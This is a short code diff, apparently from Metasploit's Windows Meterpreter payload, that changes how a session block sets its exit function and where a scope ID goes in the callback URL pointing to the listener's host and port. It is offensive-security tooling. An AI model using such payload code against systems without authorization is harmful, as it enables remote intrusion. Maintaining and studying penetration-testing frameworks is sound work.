@@ -49,11 +49,7 @@ private
 
   def session_block(opts)
     uuid = to_str(opts[:uuid].to_raw, UUID_SIZE)
-    if opts[:exitfunk]
-      exit_func = Msf::Payload::Windows.exit_types[opts[:exitfunk]]
-    else
-      exit_func = 0
-    end
+    exit_func = Msf::Payload::Windows.exit_types[opts[:exitfunk]]
 
     session_data = [
       0,                  # comms socket, patched in by the stager
@@ -74,8 +70,8 @@ private
     end
 
     url = "#{opts[:scheme]}://#{lhost}:#{opts[:lport]}"
-    url << "?#{opts[:scope_id]}" if opts[:scope_id]
     url << "#{opts[:uri]}/" if opts[:uri]
+    url << "?#{opts[:scope_id]}" if opts[:scope_id]
 
     # if the transport URI is for a HTTP payload we need to add a stack
     # of other stuff
